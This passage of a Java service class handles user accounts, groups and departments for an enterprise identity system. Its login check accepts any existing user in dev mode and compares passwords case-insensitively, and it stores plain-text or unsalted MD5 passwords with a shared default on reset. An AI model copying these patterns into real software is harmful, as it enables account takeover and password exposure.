package com.wt.uum2.service.impl;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;

import nak.nsf.pager.Pager;

import org.apache.commons.collections.CollectionUtils;
import org.apache.commons.lang.ArrayUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.shiro.SecurityUtils;
import org.springframework.transaction.annotation.Transactional;

import com.hirisun.components.net.ip.client.IP;
import com.hirisun.components.net.ip.client.utils.ClientIpUtils;
import com.hirisun.components.other.runtime.RuntimeResolver;
import com.wt.uum2.constants.Condition;
import com.wt.uum2.constants.DepartmentCondition;
import com.wt.uum2.constants.InitParameters;
import com.wt.uum2.constants.ResourceStatus;
import com.wt.uum2.constants.ResourceSyn;
import com.wt.uum2.constants.StringParse;
import com.wt.uum2.constants.UserPageResult;
import com.wt.uum2.dao.DepartmentDao;
import com.wt.uum2.dao.ResourceAdminGroupDao;
import com.wt.uum2.dao.UserDao;
import com.wt.uum2.dao.UserDepartmentDao;
import com.wt.uum2.dao.UserGroupDao;
import com.wt.uum2.domain.Application;
import com.wt.uum2.domain.AttributeType;
import com.wt.uum2.domain.Department;
import com.wt.uum2.domain.Group;
import com.wt.uum2.domain.Resource;
import com.wt.uum2.domain.User;
import com.wt.uum2.domain.UserDepartment;
import com.wt.uum2.domain.UserGroup;

/**
 * <pre>
 * 业务名:
 * 功能说明: 
 * 编写日期:	2012-3-22
 * 作者:	LiuYX
 * 
 * 历史记录
 * 1、修改日期：
 *    修改人：
 *    修改内容：
 * </pre>
 */
@Transactional
public abstract class UserServiceImpl extends ApplicationServiceImpl
{
	/**
	 * 
	 */
	protected UserDao userDao;

	/**
	 * 
	 */
	protected UserGroupDao userGroupDao;

	/**
	 * 
	 */
	protected UserDepartmentDao userDepartmentDao;

	/**
	 * 
	 */
	protected DepartmentDao departmentDao;

	/**
	 * 
	 */
	protected ResourceAdminGroupDao resourceAdminGroupDao;

	public void setUserDepartmentDao(UserDepartmentDao userDepartmentDao)
	{
		this.userDepartmentDao = userDepartmentDao;
	}

	public void setUserGroupDao(UserGroupDao userGroupDao)
	{
		this.userGroupDao = userGroupDao;
	}

	public void setUserDao(UserDao userDao)
	{
		this.userDao = userDao;
	}

	public void setDepartmentDao(DepartmentDao departmentDao)
	{
		this.departmentDao = departmentDao;
	}

	public void setResourceAdminGroupDao(ResourceAdminGroupDao resourceAdminGroupDao)
	{
		this.resourceAdminGroupDao = resourceAdminGroupDao;
	}

	@Transactional(readOnly = true)
	public List<User> getAllUsers()
	{
		return userDao.getAllUsers();
	}

	@Transactional(readOnly = true)
	public List<User> getAllNormalUsers()
	{
		return userDao.getAllNormalUsers();
	}

	/**
	 * 方法说明：getUsersByGroup
	 * 
	 * @param group
	 *            group
	 * @param start
	 *            start
	 * @param size
	 *            size
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getUsersByGroup(Group group, Integer start, Integer size)
	{
		return userDao.getUsersByGroupUUID(group.getUuid(), start, size);
	}

	/**
	 * 方法说明：deleteUser
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int deleteUser(User user)
	{// 逻辑删除用户
		if (InitParameters.isPlainPassword()) {
			user.setPlainPassword(user.getPassword());
		}
		user.setStatus(ResourceStatus.DELETE_LOGIC.intValue());
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserByUuid
	 * 
	 * @param uuid
	 *            uuid
	 * @return User
	 */
	@Transactional(readOnly = true)
	public User getUserByUuid(String uuid)
	{
		return userDao.read(uuid);
	}

	/**
	 * 方法说明：userLoginValidate
	 * 
	 * @param name
	 *            name
	 * @param password
	 *            password
	 * @return boolean
	 */
	@Transactional(readOnly = true)
	public boolean userLoginValidate(String name, String password)
	{
		boolean flag = false;
		if (StringUtils.isNotBlank(name)) {
			User user = this.getUserByUserId(name);
			if (user == null) {
				return false;
			}
			if (RuntimeResolver.isDevMode()) {
				return true;
			}
			if (InitParameters.getMD5EncodePassTurnOn().equalsIgnoreCase("true")) {
				password = StringParse.md5(password);
			}
			if ("true".equals(InitParameters.getPlainPassword())) {
				return StringUtils.equalsIgnoreCase(password, user.getPlainPassword());
			} else {
				return StringUtils.equalsIgnoreCase(password, user.getPassword());
			}
		}
		return flag;
	}

	/**
	 * 方法说明：getUserById
	 * 
	 * @param uuid
	 *            uuid
	 * @return User
	 */
	@Transactional(readOnly = true)
	public User getUserById(String uuid)
	{
		return userDao.read(uuid);
	}

	/**
	 * 方法说明：searchUsersByCondition
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchUsersByCondition(int page, int pagesize, Condition condition)
	{
		return userDao.searchUserByCondition(page, pagesize, condition);
	}

	/**
	 * 方法说明：searchUsersByCondition
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public List<User> searchUsersByCondition(Condition condition)
	{
		return userDao.searchUserByCondition(condition);
	}

	/**
	 * 方法说明：createUser
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int createUser(User user)
	{

		if (StringUtils.isBlank(user.getPassword())) {
			if ("true".equals(InitParameters.getMD5EncodePassTurnOn())) {
				user.setPlainPassword(StringParse.md5(InitParameters.getUserPassword()));
			} else {
				user.setPlainPassword(InitParameters.getUserPassword());
			}
		}
		if (user.getOrder() == null || user.getOrder() == 0) {
			user.setOrder((long) (getNumberOfUsers() + 1));
		}
		if (user.getStatus() == null) {
			user.setStatus(ResourceStatus.NORMAL.intValue());
		}
		userDao.save(user);
		if ("true".equals(InitParameters.getMD5EncodePassTurnOn())) {
		} else if (InitParameters.isPlainPassword()) {
			user.setPlainPassword(user.getPassword());
		}
		user.setModifiedTime(Calendar.getInstance().getTime());
		user.setLastUpdateTime(user.getModifiedTime());
		userDao.update(user);

		if (CollectionUtils.isNotEmpty(user.getGroups())) {
			for (Group group : user.getGroups()) {
				userGroupDao.add(user, group);
			}
		}
		if (CollectionUtils.isNotEmpty(user.getAdminGroups())) {
			for (Group group : user.getAdminGroups()) {
				resourceAdminGroupDao.add(group, user);
			}
		}
		return 1;
	}

	private int getNumberOfUsers()
	{
		return userDao.getNumberOfUsers();
	}

	/**
	 * 方法说明：updateUser
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int updateUser(User user)
	{
		user.setLastUpdateTime(Calendar.getInstance().getTime());
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserMembersByDepartment
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUserMembersByDepartment(int page, int pagesize, Department department)
	{
		return userDao.getUserMembersByDepartment(page, pagesize, department);
	}

	/**
	 * 方法说明：saveDepartmentsToUsers
	 * 
	 * @param departments
	 *            departments
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int saveDepartmentsToUsers(Set<Department> departments, User user)
	{
		user.setDepartments(departments);
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserMembersUnderDepartment
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUserMembersUnderDepartment(int page, int pagesize,
			Department department)
	{
		// List<Department> departments =
		// departmentDao.getChildrenDepartments(department);
		// return userDao.getUserMembersByDepartments(page, pagesize,
		// departments);
		return userDao.getUserMembersUnderDepartment(page, pagesize, department);
	}

	/**
	 * 方法说明：existUserId
	 * 
	 * @param userId
	 *            userId
	 * @return boolean
	 */
	@Transactional(readOnly = true)
	public boolean existUserId(String userId)
	{
		User user = userDao.readById(userId);
		if (user == null) {
			return false;
		} else {
			return true;
		}
	}

	/**
	 * 方法说明：getManagerUnderApplication
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param application
	 *            application
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getManagerUnderApplication(int page, int pagesize, Application application)
	{
		return userDao.getManagerUnderApplication(page, pagesize, application);
	}

	/**
	 * 方法说明：removeApplicationManager
	 * 
	 * @param application
	 *            application
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int removeApplicationManager(Application application, User user)
	{
		Set<Group> groups = application.getAdminGroups();// 移除应用系统的管理员
		deleteUserGroups(user, groups);
		// java.util.Iterator<Group> iterator = groups.iterator();
		// while (iterator.hasNext()) {
		// userDao.removeUserUnderGroup(iterator.next(), user);
		// }
		return 1;
	}

	/**
	 * 方法说明：setApplicationManager
	 * 
	 * @param application
	 *            application
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int setApplicationManager(Application application, User user)
	{
		Set<Group> groups = application.getAdminGroups();// 设置应用系统管理员
		addUserGroups(user, groups);
		// java.util.Iterator<Group> iterator = groups.iterator();
		// while (iterator.hasNext()) {
		// userDao.addUserUnderGroup(iterator.next(), user);
		// }
		return 1;
	}

	/**
	 * 方法说明：setApplicationMember
	 * 
	 * @param appGroup
	 *            appGroup
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int setApplicationMember(Group appGroup, User user)
	{
		// userDao.addUserUnderGroup(appGroup, user);
		addUserGroup(user, appGroup);
		return 1;
	}

	/**
	 * 方法说明：removeApplicationMember
	 * 
	 * @param appGroup
	 *            appGroup
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int removeApplicationMember(Group appGroup, User user)
	{
		// userDao.removeUserUnderGroup(appGroup, user);
		deleteUserGroup(user, appGroup);
		return 1;
	}

	/**
	 * 方法说明：searchUserUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchUserUnderGroup(int page, int pagesize, Condition condition,
			Group group)
	{
		return userDao.searchUserUnderGroup(page, pagesize, condition, group);
	}

	/**
	 * 方法说明：getUsersUnderApplicationGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param appgroup
	 *            appgroup
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUsersUnderApplicationGroup(int page, int pagesize, Group appgroup)
	{
		return userDao.getUsersUnderGroup(page, pagesize, appgroup);
	}

	/**
	 * 方法说明：addUserToDepartment
	 * 
	 * @param user
	 *            user
	 * @param department
	 *            department
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int addUserToDepartment(User user, Department department)
	{
		UserDepartment ud = new UserDepartment();
		ud.setDepartment(department);
		ud.setUser(user);
		userDepartmentDao.saveOrUpdate(ud);
		user.setPrimaryDepartment(department);
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUserUnderGroup(int page, int pagesize, Group group)
	{
		return userDao.getUsersUnderGroup(page, pagesize, group);
	}

	/**
	 * 方法说明：getUsersNotUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUsersNotUnderGroup(int page, int pagesize, Group group)
	{
		return userDao.getUsersNotUnderGroup(page, pagesize, group);
	}

	/**
	 * 方法说明：getUserUnderGroupOrderByDept
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUserUnderGroupOrderByDept(int page, int pagesize, Group group)
	{
		return userDao.getUsersUnderGroupOrderByDept(page, pagesize, group);
	}

	/**
	 * 方法说明：searchUserUnderApplicationGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchUserUnderApplicationGroup(int page, int pagesize,
			Condition condition, Group group)
	{
		return userDao.searchUserUnderApplicationGroup(page, pagesize, condition, group);
	}

	/**
	 * 方法说明：getUserManagedUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUserManagedUnderGroup(int page, int pagesize, Group group)
	{
		return userDao.getUserManagedUnderGroup(page, pagesize, group);
	}

	/**
	 * 方法说明：removeUserMemberUnderGroup
	 * 
	 * @param user
	 *            user
	 * @param group
	 *            group
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int removeUserMemberUnderGroup(User user, Group group)
	{
		deleteUserGroup(user, group);
		return 1;// userDao.removeUserUnderGroup(group, user);
	}

	/**
	 * 方法说明：setUserMemberUnderGroup
	 * 
	 * @param user
	 *            user
	 * @param group
	 *            group
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int setUserMemberUnderGroup(User user, Group group)
	{
		addUserGroup(user, group);
		return 1;// userDao.addUserUnderGroup(group, user);
	}

	/**
	 * 方法说明：getLogicDeleteUsersUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getLogicDeleteUsersUnderGroup(int page, int pagesize, Group group)
	{
		return userDao.getLogicDeleteUsersUnderGroup(page, pagesize, group);
	}

	/**
	 * 方法说明：searchLogicDeleteUsersUnderGroup
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchLogicDeleteUsersUnderGroup(int page, int pagesize,
			Condition condition, Group group)
	{
		return userDao.searchLogicDeleteUsersUnderGroup(page, pagesize, condition, group);
	}

	/**
	 * 方法说明：restoreUser
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int restoreUser(User user)
	{
		if (InitParameters.isPlainPassword()) {
			user.setPlainPassword(InitParameters.getUserPassword());
		} else {
			user.setPassword(InitParameters.getUserPassword());
		}
		user.setStatus(ResourceStatus.NORMAL.intValue());
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserDepartments
	 * 
	 * @param user
	 *            user
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<Department> getUserDepartments(User user)
	{
		return userDao.getUserDepartments(user);
	}

	/**
	 * 方法说明：getLogicDeleteUsersUnderDepartment
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	/**
	 * 方法说明：getLogicDeleteUsersUnderDepartment
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getLogicDeleteUsersUnderDepartment(int page, int pagesize,
			Department department)
	{
		List<Department> list = new ArrayList<Department>();
		list.add(department);
		return userDao.getLogicDeleteUsersUnderDepartment(page, pagesize, list);
	}

	/**
	 * 方法说明：searchLogicDeleteUsersUnderDepartment
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchLogicDeleteUsersUnderDepartment(int page, int pagesize,
			Condition condition, Department department)
	{
		return userDao.searchLogicDeleteUsersUnderDepartment(page, pagesize, condition, department);
	}

	/**
	 * 方法说明：getLoginUser
	 * 
	 * @return getLoginUser
	 */
	@Transactional(readOnly = true)
	public User getLoginUser()
	{
		// guotianci 修改 2011.11.25 -- start
		// String userId = sso.getCurrentUsername();
		String userId = null;
		Object principal = SecurityUtils.getSubject().getPrincipal();
		if (principal != null) {
			userId = principal.toString();
		}

		// String userId = SecurityUtils.getSubject().getPrincipal().toString();
		// guotianci 修改 2011.11.25 -- end
		if (StringUtils.isBlank(userId)) {
			return null;
		} else {
			return userDao.readById(userId);
		}
	}

	/**
	 * 方法说明：getOperatorIpAddress
	 * 
	 * @return String
	 */
	@Transactional
	public String getOperatorIpAddress()
	{
		String ip = null;
		try {
			IP clientIp = ClientIpUtils.getIP();
			if (clientIp != null) {
				ip = clientIp.getAddr();
			}
		} catch (Exception e) {
			// ignore
		}
		return String.valueOf(ip);
	}

	/**
	 * 方法说明：isUserUnderGroup
	 * 
	 * @param user
	 *            user
	 * @param group
	 *            group
	 * @return boolean
	 */
	@Transactional(readOnly = true)
	public boolean isUserUnderGroup(User user, Group group)
	{
		return getUserGroups(user).contains(group);
	}

	/**
	 * 方法说明：getUserGroups
	 * 
	 * @param user
	 *            user
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<Group> getUserGroups(User user)
	{
		return userDao.getUserGroups(user);
	}

	/**
	 * 方法说明：getLogicDelUsersUnderDeptAndSubDept
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param department
	 *            department
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getLogicDelUsersUnderDeptAndSubDept(int page, int pagesize,
			Department department)
	{
		return userDao.getLogicDeleteUsersUnderDepartment(page, pagesize, department);
	}

	/**
	 * 方法说明：resetUserPassword
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int resetUserPassword(User user)
	{
		if (InitParameters.getMD5EncodePassTurnOn().equalsIgnoreCase("true")) {
			user.setPassword(StringParse.md5(InitParameters.getUserPassword()));
		} else if (InitParameters.isPlainPassword()) {
			user.setPlainPassword(InitParameters.getUserPassword());
		} else {
			user.setPassword(InitParameters.getUserPassword());
		}
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：getUserByUserId
	 * 
	 * @param id
	 *            id
	 * @return User
	 */
	@Transactional(readOnly = true)
	public User getUserByUserId(String id)
	{
		return userDao.readById(id);
	}

	/**
	 * 方法说明：authorUser
	 * 
	 * @param user
	 *            user
	 * @return int
	 */
	@Transactional(readOnly = false)
	public int authorUser(User user)
	{
		Long currentLevel = user.getCurrentAuthorLevel() == null ? 0 : user.getCurrentAuthorLevel();
		if (currentLevel > 0) {
			currentLevel = currentLevel - 1;
			user.setCurrentAuthorLevel(currentLevel);
		}
		if (currentLevel == 0) {
			user.setStatus(ResourceStatus.NORMAL.intValue());
		}
		userDao.update(user);
		return 1;
	}

	/**
	 * 方法说明：searchUsersMembersByLoginUser
	 * 
	 * @param size
	 *            size
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param loginUser
	 *            loginUser
	 * @param group
	 *            group
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchUsersMembersByLoginUser(int size, int pagesize,
			Condition condition, User loginUser, Group group)
	{
		List<Group> userAppGroups = null;// this.getAdminGroupByLoginUser(loginUser);
		return userDao.searchUsersMembersByLoginUser(size, pagesize, condition, loginUser, group,
				userAppGroups);
	}

	/**
	 * 方法说明：isUserAssessor
	 * 
	 * @param user
	 *            user
	 * @return boolean
	 */
	@Transactional(readOnly = true)
	public boolean isUserAssessor(User user)
	{
		List<Group> groups = this.getUserGroups(user);
		if (groups.size() > 0) {
			return true;
		}
		return false;
	}

	/**
	 * 方法说明：searchERPUsersByCondition
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchERPUsersByCondition(int page, int pagesize, Condition condition)
	{
		// return userDao.searchUsersByConditionAndUserCameFrom(page, pagesize,
		// condition,"0");
		return userDao.searchUsersByConditionAndERPCode(page, pagesize, condition);
	}

	/**
	 * 方法说明：searchERPUsersByConditionAndOrgCode
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param orgCode
	 *            orgCode
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchERPUsersByConditionAndOrgCode(int page, int pagesize,
			Condition condition, String orgCode)
	{
		return userDao.searchUsersByConditionAndERPCodeAndOrgCode(page, pagesize, condition,
				orgCode);
	}

	/**
	 * 方法说明：getLogicDeleteUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getLogicDeleteUsers(int page, int pagesize)
	{
		return userDao.getLogicDeleteUsers(page, pagesize);
	}

	/**
	 * 方法说明：searchLogicDeleteUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchLogicDeleteUsers(int page, int pagesize, Condition condition)
	{
		return userDao.searchLogicDeleteUsers(page, pagesize, condition);
	}

	/**
	 * 方法说明：getRelationUsers
	 * 
	 * @param user
	 *            user
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getRelationUsers(User user)
	{
		return userDao.getRelationUsers(user);
	}

	/**
	 * 方法说明：getUserResourceSyn
	 * 
	 * @param user
	 *            user
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<ResourceSyn> getUserResourceSyn(User user)
	{
		return userDao.getUserResourceSyn(user);
	}

	/**
	 * 方法说明：clearSession
	 * 
	 * @return int
	 */
	@Transactional(readOnly = true)
	public int clearSession()
	{
		return userDao.clearSession();
	}

	/**
	 * 方法说明：getLeftUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getLeftUsers(int page, int pagesize)
	{
		User user = this.getLoginUser();
		return getUserListByStatus(page, pagesize, user, ResourceStatus.LEAVE);
	}

	/**
	 * 方法说明：searchLeftUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchLeftUsers(int page, int pagesize, Condition condition)
	{
		User user = this.getLoginUser();
		return searchUsersByStatus(page, pagesize, condition, user, ResourceStatus.LEAVE);
	}

	/**
	 * 方法说明：通过用户状态取得用户列表
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param user
	 *            user
	 * @param rs
	 *            rs
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	private UserPageResult getUserListByStatus(int page, int pagesize, User user, ResourceStatus rs)
	{
		return userDao.getUserListByStatus(page, pagesize, user, rs);
	}

	/**
	 * 方法说明：搜索某用户状态下的用户
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @param user
	 *            user
	 * @param rs
	 *            rs
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	private UserPageResult searchUsersByStatus(int page, int pagesize, Condition condition,
			User user, ResourceStatus rs)
	{
		return userDao.searchUserListByStatus(page, pagesize, user, condition, rs);
	}

	/**
	 * 方法说明：getRetiredUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getRetiredUsers(Integer page, Integer pagesize)
	{
		User user = this.getLoginUser();
		return getUserListByStatus(page, pagesize, user, ResourceStatus.RETIRED);
	}

	/**
	 * 方法说明：searchRetiredUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param condition
	 *            condition
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult searchRetiredUsers(Integer page, Integer pagesize, Condition condition)
	{
		User user = this.getLoginUser();
		return searchUsersByStatus(page, pagesize, condition, user, ResourceStatus.RETIRED);
	}

	/**
	 * 方法说明：getUserResourceSynByAttributeTypeIdKey
	 * 
	 * @param resource
	 *            resource
	 * @param keys
	 *            keys
	 * @return Map
	 */
	@Transactional(readOnly = true)
	public Map<String, String> getUserResourceSynByAttributeTypeIdKey(Resource resource,
			List<String> keys)
	{
		return userDao.getUserResourceSyn(resource, keys);
	}

	/**
	 * 方法说明：rollbackUserFromDepartment
	 * 
	 * @param user
	 *            user
	 * @return boolean
	 */
	@Transactional(readOnly = false)
	public boolean rollbackUserFromDepartment(User user)
	{
		Department primaryDepartment = departmentDao.getPrimaryDepartmentByUser(user);
		if (primaryDepartment != null) {
			Set<Department> depts = new HashSet<Department>();
			depts.add(primaryDepartment);
			user.setDepartments(depts);
			try {
				userDao.update(user);
				return true;
			} catch (Exception e) {
				return false;
			}
		} else {
			return false;
		}
	}

	/**
	 * 方法说明：getLastUserId
	 * 
	 * @param typeid
	 *            typeid
	 * @return String
	 */
	@Transactional(readOnly = false)
	public String getLastUserId(String typeid)
	{
		return userDao.countNum(typeid);
	}

	/**
	 * 方法说明：getAllUsersUnderDepartment
	 * 
	 * @param department
	 *            department
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getAllUsersUnderDepartment(Department department)
	{
		return userDao.getAllUsersUnderDepartment(department);
	}

	/**
	 * 方法说明：getUserAdminGroup
	 * 
	 * @param user
	 *            user
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<Group> getUserAdminGroup(User user)
	{
		return userDao.getUserAdminGroup(user);
	}

	/**
	 * 方法说明：getAttributesMapByResourceAndTypes
	 * 
	 * @param resource
	 *            resource
	 * @param keys
	 *            keys
	 * @return Map
	 */
	@Transactional(readOnly = true)
	public Map<String, String> getAttributesMapByResourceAndTypes(Resource resource, String... keys)
	{
		if (ArrayUtils.isEmpty(keys)) {
			return getAttributesMapByResource(resource);
		}
		Map<String, String> attin = getAttributesMapByResource(resource);
		Map<String, String> attout = new HashMap<String, String>();
		for (String string : keys) {
			if (attin.get(string) != null) {
				attout.put(string, attin.get(string).toString());
			}
		}
		return attout;
	}

	/**
	 * 方法说明：通过用户及需要的属性键值取得用户属性的集合型
	 * 
	 * @param resource
	 *            resource
	 * @param keys
	 *            keys
	 * @return Map
	 */
	public Map<String, String> getAttributesMapByResourceAndTypes(Resource resource,
			AttributeType... ats)
	{
		Map<String, String> map = new HashMap<String, String>();
		for (AttributeType type : ats) {
			map.put(type.getId(), null);
		}
		return getAttributesMapByResourceAndTypes(resource, map);
	}

	/**
	 * 方法说明：通过用户及需要的属性键值取得用户属性的集合型
	 * 
	 * @param resource
	 *            resource
	 * @param keys
	 *            keys
	 * @return Map
	 */
	public Map<String, String> getAttributesMapByResourceAndTypes(Resource resource,
			Collection<AttributeType> ats)
	{
		Map<String, String> map = new HashMap<String, String>();
		for (AttributeType type : ats) {
			map.put(type.getId(), null);
		}
		return getAttributesMapByResourceAndTypes(resource, map);
	}

	/**
	 * 方法说明：getAttributesMapByResourceAndTypes
	 * 
	 * @param resource
	 *            resource
	 * @param keys
	 *            keys
	 * @return Map
	 */
	@Transactional(readOnly = true)
	public Map<String, String> getAttributesMapByResourceAndTypes(Resource resource,
			Map<String, String> keys)
	{
		return getAttributesMapByResourceAndTypes(resource,
				keys.keySet().toArray(new String[keys.size()]));
	}

	/**
	 * 方法说明：getAttributesMapByResource
	 * 
	 * @param resource
	 *            resource
	 * @return Map
	 */
	@Transactional(readOnly = true)
	public Map<String, String> getAttributesMapByResource(Resource resource)
	{
		return userDao.getAttributesMapByResource(resource);
	}

	/**
	 * 方法说明：getUsersUnderDepartment
	 * 
	 * @param department
	 *            department
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getUsersUnderDepartment(Department department)
	{
		if (department == null) {
			return new ArrayList<User>();
		}
		return userDao.getUsersByDepartment(department);
	}

	/**
	 * 方法说明：getUsersByDepartments
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param depts
	 *            depts
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	public UserPageResult getUsersByDepartments(int page, int pagesize, List<Department> depts)
	{
		if (CollectionUtils.isNotEmpty(depts)) {
			return userDao.getUsersByDepartments(page, pagesize, depts);
		} else {
			UserPageResult upr = new UserPageResult<User>();
			upr.setList(new ArrayList<User>());
			upr.setPager(new Pager());
			return new UserPageResult<User>();
		}
	}

	/**
	 * 方法说明：getUserByAttributes
	 * 
	 * @param attList
	 *            attList
	 * @param attrValue
	 *            attrValue
	 * @return List
	 */
	@Transactional(readOnly = true)
	public List<User> getUserByAttributes(List<AttributeType> attList, String attrValue)
	{
		return userDao.getUserByAttributes(attList, attrValue);
	}

	// Added by Guo Tianci, -start 2011 -08 -08 --start
	/**
	 * 获得用户数量
	 * 
	 * @return 用户数量
	 */
	@Transactional(readOnly = true)
	public long countUser()
	{
		return userDao.getUserCount();
	}

	// --end

	/**
	 * 方法说明：通过用户状态取得用户列表
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
	 * @param user
	 *            user
	 * @param rs
	 *            rs
	 * @return UserPageResult
	 */
	@Transactional(readOnly = true)
	private UserPageResult getUserListByStatuses(int page, int pagesize, User user,
			ResourceStatus... rs)
	{
		return userDao.getUserListByStatuses(page, pagesize, user, rs);
	}

	/**
	 * 方法说明：getVoidUsers
	 * 
	 * @param page
	 *            page
	 * @param pagesize
	 *            pagesize
